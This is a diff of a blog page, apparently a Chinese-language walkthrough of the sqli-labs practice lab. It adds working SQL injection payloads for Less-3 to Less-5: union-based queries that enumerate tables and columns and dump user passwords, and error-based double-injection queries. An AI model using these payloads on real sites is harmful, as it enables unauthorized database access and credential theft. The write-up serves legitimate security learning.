@@ -33,7 +33,10 @@ ga('send', 'pageview');
 <meta property="og:image" content="https://s2.ax1x.com/2019/02/28/kHSWFg.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/02/28/kHp8hQ.png">
 <meta property="og:image" content="https://s2.ax1x.com/2019/02/28/kHpan0.png">
-<meta property="og:updated_time" content="2019-02-28T13:04:10.020Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/01/kHbj8P.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/01/kbMSh9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/03/01/kbQiCj.png">
+<meta property="og:updated_time" content="2019-03-01T14:21:35.669Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs">
 <meta name="twitter:description" content="Less-1 single 单个的quote 引号变量前面加 ?information_schema.tablesinformation_schema.columnsinformation_schema.schemata  在Less-1里的index.php中添加 echo $sql; 可在网页中显示查询代码，echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;; 表示换行    ?id=1&amp;">
@@ -142,7 +145,22 @@ ga('send', 'pageview');
 <li><code>?id=1 and 1=1</code>正确</li>
 <li><code>?id=1 and 1=2</code>错误<br>可知是数字型注入<br><em>解题与第一题类似，不再赘述</em></li>
 </ul>
-<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><hr>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>查看源码可知，用<code>()</code>加在了id两边，所以只要将<code>()</code>闭合就行了<br><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+</code></p>
+<p><a href="https://imgchr.com/i/kHbj8P" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHbj8P.png" alt="kHbj8P.png"></a></p>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>查看源码，id两边加了”,用<code>?id=-1&quot;)</code>闭合</p>
+<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p><strong><em>双注入</em></strong></p>
+<ol>
+<li>Rand() //随机函数</li>
+<li>Floor() //取整函数</li>
+<li>Count() //汇总函数</li>
+<li>Group by clause //分组语句</li>
+</ol>
+<p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440" target="_blank" rel="noopener">https://blog.csdn.net/Leep0rt/article/details/78556440</a></p>
+<p><code>?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbMSh9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kbMSh9.png" alt="kbMSh9.png"></a><br>select 查询列数要相同，否则报错</p>
+<p><code>?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbQiCj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kbQiCj.png" alt="kbQiCj.png"></a><br>用<code>group_concat</code>会报错，使用<code>limit</code></p>
+<hr>
+<p>更新于2019-03-01 22:21:15 星期五</p>
+<hr>
 
       
     </div>
@@ -150,7 +168,7 @@ ga('send', 'pageview');
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjsoq3mm60001ysw8tcxxiuso" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjsq5cguz0001q8w8v6bcwvxn" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
